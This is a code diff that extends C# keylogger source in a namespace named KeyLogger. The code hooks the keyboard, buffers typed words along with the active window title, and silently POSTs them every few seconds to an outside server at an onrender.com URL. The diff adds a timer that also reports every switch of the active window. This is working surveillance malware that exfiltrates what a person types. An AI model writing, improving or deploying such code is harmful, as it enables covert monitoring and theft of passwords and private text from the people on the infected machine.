@@ -15,17 +15,20 @@ namespace KeyLogger {
     private const int WM_KEYDOWN = 0x0100;
     private static string currentWord = "";
     private static string currentWindowTitle = "";
+    private static string previousWindowTitle = "";
     private static string fullTextBuffer = "";
     private static string lastSentText = "";
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
     private static System.Threading.Timer sendTimer;
+    private static System.Threading.Timer clickTimer;
     private static object lockObject = new object();
 
     public static void Main() {
       hookId = SetHook(hookProc);
-      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000); // every 3s
+      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000);
+      clickTimer = new System.Threading.Timer(CheckAppClick, null, 1000, 1000); // check every 1s
       Application.Run();
       UnhookWindowsHookEx(hookId);
     }
@@ -37,10 +40,12 @@ namespace KeyLogger {
 
     private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-    private static void SendWordToServer(string word) {
+    private static void SendWordToServer(string word, string windowTitle = null) {
       ThreadPool.QueueUserWorkItem(state => {
         try {
-          string jsonBody = "{ \"words\": \"" + word.Replace("\"", "\\\"") + "\", \"window_title\": \"" + currentWindowTitle.Replace("\"", "\\\"") + "\" }";
+          string safeTitle = (windowTitle ?? currentWindowTitle).Replace("\"", "\\\"");
+          string safeWord = word.Replace("\"", "\\\"");
+          string jsonBody = "{ \"words\": \"" + safeWord + "\", \"window_title\": \"" + safeTitle + "\" }";
           string url = "https://xenv1.onrender.com/captures";
           var webRequest = WebRequest.Create(url);
           webRequest.Method = "POST";
@@ -55,7 +60,7 @@ namespace KeyLogger {
           var response = webRequest.GetResponse();
           response.Close();
         } catch {
-          // Fail silently
+          // Silent fail
         }
       });
     }
@@ -68,6 +73,15 @@ namespace KeyLogger {
         }
       }
     }
+
+    private static void CheckAppClick(object state) {
+  string activeWindow = GetActiveWindowTitle();
+  if (activeWindow != previousWindowTitle && !string.IsNullOrWhiteSpace(activeWindow)) {
+    previousWindowTitle = activeWindow;
+    SendWordToServer(string.Format("clicked: \"{0}\"", activeWindow), activeWindow);
+  }
+  }
+
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
